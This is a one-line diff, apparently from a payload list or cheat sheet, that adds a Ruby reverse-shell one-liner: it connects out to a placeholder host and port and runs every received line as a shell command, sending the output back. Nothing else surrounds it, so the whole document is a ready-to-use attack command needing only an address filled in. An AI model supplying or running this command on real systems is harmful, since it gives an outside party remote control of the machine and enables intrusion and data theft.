@@ -1,0 +1,1 @@
+ruby -rsocket -e 's = TCPSocket.new("*\host*",*\port*); while(cmd = s.gets); IO.popen(cmd,"r"){|io| s.print io.read} end'
